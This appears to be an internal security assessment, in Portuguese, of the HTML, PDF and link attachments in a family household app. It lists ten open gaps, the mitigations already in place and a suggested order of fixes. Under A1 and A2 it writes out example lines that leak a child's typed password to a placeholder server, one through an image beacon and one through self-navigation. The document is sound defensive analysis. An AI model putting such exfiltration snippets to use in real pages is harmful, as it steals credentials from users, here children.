# Segurança dos anexos — retrato das brechas atuais

**Data:** 2026 · **Escopo:** anexos de **tarefa** e do **baú** (`/chest`)
**Referências:** ADR-0024 (baú) · ADR-0025 (anexo HTML) · ADR-0005 (bucket público)

Documento de **retrato**, não de plano: registra o que está aberto hoje, com
problema, causa, resultado e a solução possível de cada um — inclusive quando a
solução possível é "ninguuma técnica resolve".

---

## 1. Modelo de ameaça (leia antes da lista)

Só o **ADMIN** anexa arquivo. Isso define quem é o adversário:

| Quem | Como chegaria ao anexo malicioso | O app segura? |
|---|---|---|
| Tutor malicioso | anexo próprio | **Sim** para a sessão (origem opaca). **Não** para a criança: phishing |
| Conta do ADMIN comprometida | anexo pelo tutor | idem |
| Terceiro que engana o tutor | o tutor anexa o arquivo | **Não** — nenhum app segura esse caso |
| Dependent | **não anexa nada** | fora do modelo |

Consequência prática: a defesa de sessão é boa e **não precisa ser reforçada**; a
defesa de *conteúdo enganoso* é parcial e **é o que falta**. E o pior caso
(terceiro que engana o tutor) está fora do alcance de qualquer código.

O material é servido pela rota do app em **origem opaca**
(`CSP: sandbox allow-scripts`), então **não há roubo de sessão, cookie ou
`localStorage`** em nenhum cenário.

---

## 2. Resumo

| # | Brecha | Gravidade | Fecha com |
|---|---|---|---|
| A1 | Exfiltração por **beacon de imagem** | 🔴 alta | ⚠️ só quebrando o material ou `img-src` sem `https:` |
| A2 | Exfiltração por **auto-navegação** | 🔴 alta | ⚠️ **nenhuma CSP fecha** |
| A3 | **Bucket público**: a URL *é* a autorização | 🟠 média | URL assinada / bucket privado |
| A4 | **Teto de 5 MB só no client** | 🟠 média | limite no bucket + validação no servidor |
| A5 | Cap do baú conta **itens**, não **bytes**; e é por casa | 🟡 baixa-média | coluna `file_size` |
| A6 | **PDF** servido fora da nossa CSP | 🟡 baixa-média | rota própria com CSP |
| A7 | **Link externo**: destino arbitrário, sem reputação | 🟠 média | reputação / warning mais forte |
| A8 | **Auto-link do browser** em texto livre | 🟢 baixa | recusar URL no texto (decisão conscious) |
| A9 | **Sem rate limit** na rota de HTML | 🟢 baixa | rate limit por sessão |
| A10 | `house_id` vaza na URL do storage | ⚪ info | folder opaca |

**A decisão que carrega quase tudo:** `allow-scripts` (A1 + A2). Sem ele não existe
exfiltração nenhuma — ao custo de quebrar anexo que precise de JavaScript.

---

## 3. As brechas

### A1. Exfiltração por beacon de imagem

- **Problema.** A página HTML anexada pode vazar o que a criança digitar nela.
- **Causa.** `img-src data: blob: https:` permite carregar imagem de **qualquer**
  origem https, e o CSP não distingue "imagem" de "exfiltração". Com script
  liberado, basta `new Image().src = 'https://servidor/?p=' + valorDigitado`.
  O `connect-src 'none'` não impede isso: beacon por imagem não passa por `fetch`.
- **Resultado.** Uma tela falsa de login consegue **entregar a senha digitada** a
  um servidor externo. É o risco mais concreto do recurso, porque a vítima é
  criança e o destino sai do app.
- **Solução possível.**
  - Fechar de verdade: `img-src data: blob:` (sem `https:`) — **quebra toda imagem
    externa** do material ( thumbnail, imagem de CDN), ou seja, boa parte do uso real.
  - Fechar de verdade (outro caminho): `CSP: sandbox` **sem** `allow-scripts` —
    a página renderiza com CSS e **não executa JS**, logo não há exfiltração; custo:
    anexo interativo quebra.
  - **Aceitar** (escolha atual): manter `https:` em `img-src` e rely na barreira
    humana — a tela `/abrir-anexo` (aviso em linguagem de criança + 3s + caixinha).
    É a única opção que mantém o material utilizável.

### A2. Exfiltração por auto-navegação

- **Problema.** A página pode levar o dado embora **navegando a si mesma**.
- **Causa.** **Nenhuma CSP bloqueia navegação.** A diretiva `navigate-to` foi removida
  da especificação e nunca foi implementada (o Chrome nunca suportou). E o
  `sandbox` sem `allow-top-navigation` só restringe navegar *outros* contextos
  (frames aninhados) — o documento pode sempre navegar **a si mesmo**.
- **Resultado.** `location.href = 'https://servidor/?p=' + senha` leva o dado
  embora, em uma navegação normal do navegador.
- **Solução possível.** **Nenhuma por CSP.** Só existem as duas saídas já
  avaliadas: não renderizar (`Content-Disposition: attachment`) ou remover
  `allow-scripts`. Foi por isso que a decisão foi manter renderizar + aviso.

### A3. Bucket público — a URL é a autorização

- **Problema.** A autorização da rota de HTML (`loadHtmlAttachment`) **não é
  fronteira de confidencialidade**: o arquivo em si é público.
- **Causa.** O bucket `casasync-media` é público (ADR-0005, decisão antiga para as
  imagens), e a URL do storage viaja dentro do payload RSC de quem tem acesso.
- **Resultado.** Quem tiver a URL acessa o arquivo **para sempre, sem sessão**.
  Encaminhar o link entrega o material a qualquer pessoa. E o caminho
  `tasks/<houseId>/<uuid>.ext` **exporõe o UUID da casa** (ver A10).
- **Solução possível.** Duas, ambas com custo real:
  - `createSignedUrl` de vida curta gerada pelo servidor, trocando a URL pública por
    URL assinada; revoke e expiração passam a existir.
  - Bucket privado + proxy autenticado (a rota que já existe passa a ser a única
    porta de entrada). Mais simples de auditar, mas exige reupload do acervo
    existente e muda o ADR-0005.

### A4. Teto de 5 MB só no client

- **Problema.** Um client burlado sobe um arquivo muito maior que 5 MB.
- **Causa.** O upload vai do **browser direto para o storage**; a Server Action
  recebe só a URL já gravada e valida pasta/MIME/nome — **nunca vê os bytes nem o
  tamanho**. E o bucket **não tem `file_size_limit`** (o SQL que o criou não define
  `allowed_mime_types`/`file_size_limit`; ambos são `null`).
- **Resultado.** Com o bucket de **1 GB compartilhado entre todas as casas**, um
  arquivo grande (ou vários) **derruba o upload do app inteiro** — o problema é de
  disponibilidade e atinge todas as casas, não só a casa do anexo.
- **Solução possível.**
  - Curto prazo, sem código: definir `file_size_limit` no bucket (5 MB) — é
    configuração, não migration, e o storage recusa o upload grande.
  - No servidor: um `HEAD`/`Content-Length` na URL antes de gravar a linha, e
    recusar acima do teto (fecha o registro de item com arquivo grande, mesmo que o
    upload tenha passado).
  - Estrutural: passar o upload pelo servidor (Server Action com FormData), o que
    também centraliza a validação de tipo — custo alto para o ganho.

### A5. Cap do baú conta itens, não bytes — e é por casa

- **Problema.** O limite de 50 itens (`chest_rules`) contém o **apetite de uma
  casa**, não o total do bucket.
- **Causa.** Não há coluna de tamanho de arquivo: para somar bytes seria preciso
  `file_size`, que não existe. E o bucket é compartilhado: N casas × 250 MB
  estouram 1 GB.
- **Resultado.** Com 3–4 casas ativas, o teto por casa não impede o esgotamento
  coletivo do storage.
- **Solução possível.** Migration com `file_size` gravado no create, e o teto
  virando "bytes por casa" (o `checkChestItemLimit` passaria a somar em vez de
  contar). Custo: uma coluna + uma soma no `SELECT`; o limite de itens continua
  virando proteção simples.

### A6. PDF servido fora da nossa CSP

- **Problema.** A política restritiva vale **só para o HTML**, porque só o HTML
  passa pela rota do app. O PDF vai direto pela URL pública do storage.
- **Causa.** O Supabase entrega o `content-type` correto do PDF, então não há
  defeito de exibição que force passar pelo app (ao contrário do HTML).
- **Resultado.** O viewer do Chrome **bloqueia JS e submissão de PDF**, então o
  dano é visual: um PDF pode exibir uma tela falsa estática de login. Risco
  baixo-médio, e fora da origem do app (a barra de endereço mostra o storage).
- **Solução possível.** Servir o PDF por rota própria com a mesma política
  restritiva, ou forçar download (`attachment`). Custo baixo, benefício baixo —
  recommendation: aceitar e registrar.

### A7. Link externo — destino arbitrário

- **Problema.** O ADMIN pode apontar o anexo para qualquer site da internet.
- **Causa.** Decisão de produto: link é material externo por definição, e a
  validação é fail-closed de esquema (`http`/`https`) + recusa de storage interno.
  **Não há filtro de reputação.**
- **Resultado.** O destino pode ser phishing, distribuição de malware ou conteúdo
  impróprio.
  A mitigação atual é o domínio **inteiro** na tela (sem truncamento enganoso) +
  selo "Site externo" — que resolve o engano visual, não o destino.
- **Solução possível.**
  - Google Safe Browsing API no momento de salvar o link (classificação do domínio),
    barrando na action com mensagem clara. Custo: uma chamada externa no create.
  - Lista de bloqueio/allowlist por casa (mais simples, menos cobertura).
  - **Aceitar** e rely no selo + no domínio visível.

### A8. Auto-link do browser em texto livre

- **Problema.** Um título/descrição que pareça URL vira link clicável **pelo
  navegador**, fora das nossas regras.
- **Causa.** Comportamento do iOS Safari e do Android Chrome (*touch links*): o
  detector reconhece `http`/`https`/`www`/`tel` e cria o próprio `href`. Não há
  HTML, CSS ou atributo que desative isso. Eles **não** linkificam esquemas
  executáveis, então **não é XSS**.
- **Resultado.** Navegação que não passou pelo nosso allowlist de link (nem pela
  recusa de storage interno). Impacto baixo: só um ADMIN escreve título, e o
  bucket é público de todo modo (A3).
- **Solução possível.** Recusar texto com cara de URL nos validadores de campos
  livres (título, descrição, motivo), com mensagem "use o campo Link". Foi
  **avaliado e recusado** pelo usuário: o custo é bloquear texto legítimo e não
  remove o canal de quem já conhece a URL.

### A9. Sem rate limit na rota de HTML

- **Problema.** Cada `GET /api/task-attachment/[id]` faz o **servidor** buscar o
  arquivo no storage e retransmitir.
- **Causa.** Não há rate limiting por sessão/usuário em nenhuma rota do app.
- **Resultado.** Amplificação pequena (requer sessão válida; `no-store` evita
  reuso de cache). Não há exposição de dados: a autorização roda antes do `fetch`.
- **Solução possível.** Rate limit por sessão na rota (ou plataforma). Custo baixo,
  ganho baixo — recommendation: aceitar.

### A10. `house_id` vaza na URL do storage

- **Problema.** O caminho do arquivo expõe o identificador da casa.
- **Causa.** `uploadMedia` monta `<folder>/<ownerId>/<uuid>.<ext>` e o `ownerId` dos
  anexos é o `house_id`.
- **Resultado.** Quem tem a URL conhece o UUID de uma casa que não é dele. É
  identificador interno, não credencial (nenhuma autorização depende dele — toda
  checagem é por `house_members`), então o impacto é mínimo.
- **Solução possível.** Usar o `user.id` do ADMIN como `ownerId` (o `house_id`
  continua no banco, que é o que a autorização consulta), ou um id opaco. Uma
  linha, **desde que** a validação de pasta não passe a depender do `houseId` — hoje
  ela compara com a **pasta**, não com o dono, então a troca é segura.

---

## 4. O que já está coberto (para não mexer por engano)

Estes pontos foram verificados e **funcionam**; mexer neles é regredir segurança:

- **Origem opaca** (`sandbox allow-scripts` sem `allow-same-origin`): sem cookie,
  sem `localStorage`/`sessionStorage`, sem `window.opener`, sem popups, sem navegar
  a aba que abriu, sem submissão nativa de formulário.
- **Roubo de sessão é impossível** por qualquer caminho do anexo — inclusive com
  página maliciosa. Este é o motivo de o `sandbox` existir.
- **`connect-src 'none'`**: `fetch`/XHR/WebSocket/`sendBeacon` bloqueados.
- **`form-action 'none'`**: envio de formulário bloqueado.
- **`default-src 'none'`**: `<iframe>`, `<object>`, Web Worker e `<link rel=prefetch>`
  bloqueados.
- **Validação fail-closed do arquivo gravado**: URL tem que estar no bucket e na
  pasta do módulo (`tasks/`, `chest/`, `achievements/`, `messages/`), MIME na lista
  fechada, nome ≤120 sem caractere de controle. Tudo revalidado no servidor, porque
  URL e MIME chegam do cliente.
- **Link fail-closed**: só `http:`/`https:` (lista de dois esquemas, não bloqueio),
  nunca apontando para o storage interno — e **o que é gravado é o que foi
  validado** (`normalizeAttachmentLink` grava o `href` do parser).
- **`SVG` fora da lista** de anexos e do `ImageUpload`: SVG executa script e seria
  servido na origem do storage.
- **Título/nome são texto**, nunca `href` — sem `dangerouslySetInnerHTML` em
  lugar nenhum do app, e o chip mostra o domínio do link **sem truncamento**.
- **Remoção do arquivo antigo** do bucket quando o anexo é trocado ou excluído
  (best-effort, com guarda de pasta) — sem isso o storage só cresceria.
- **`X-Content-Type-Options: nosniff`** + `Cache-Control: private, no-store` na rota
  de HTML; e o **service worker não faz cache** de `/api/` (nem de payload RSC).
- **Limite de itens do baú** (`chest_rules.maxItems`, default 50) com barreira no
  servidor.

---

## 5. O que não resolve (para parar de procurar a solução)

| Tentativa | Por que não funciona |
|---|---|
| CSP para bloquear navegação | `navigate-to` foi removido da spec; **nunca** implementada |
| `'self'` na CSP | Em origem opaca não casa com nada — não é "o domínio do app" |
| `img-src` sem `https:` | Mata o beacon, **não** a navegação (A2), e quebra imagem externa |
| Bucket privado sozinho | Continua sem teto de tamanho (A4) e sem limite de itens (A5) |
| Sanitizar o HTML do anexo | O HTML **é** o material do tutor; sanitizar o destrói |
| Rate limit na rota | Nada na rota é abusável sem sessão; não fecha A1/A2 |

---

## 6. Ordem de ataque sugerida (custo × ganho)

1. **`file_size_limit` no bucket** — configuração, sem código, sem migration, e
   fecha o vetor de disponibilidade mais concreto (A4).
2. **`house_id` fora da URL** — uma linha, sem efeito colateral (A10).
3. **Rate limit** em `/api/task-attachment/[id]` — few lines, ganho baixo (A9).
4. **Safe Browsing no link** — fecha o destino arbitrário (A7), se incomodar.
5. **URL assinada / bucket privado** — resolve A3 de vez, mas é a maior mudança
   (reupload + revisao do ADR-0005).
6. **A1 + A2 só fecham com `sandbox` sem `allow-scripts` ou sem renderizar** —
   decisão de produto, não de engenharia, e ambas já foram avaliadas e recusadas.

---

## 7. Decisões registradas (não são brecha, mas são contexto)

- **HTML renderizado, com aviso + fricção** em vez de download — ADR-0025.
- **`allow-scripts` liberado** — sem ele não há exfiltração, mas quebra material
  interativo (ADR-0025).
- **`img-src`/mídia com `https:`** — fecha beacon *e* navegação custaria o material
  de CDN inteiro (ADR-0025, emenda).
- **Sem notificação ao adicionar item no baú** — é consulta, não evento (ADR-0024).
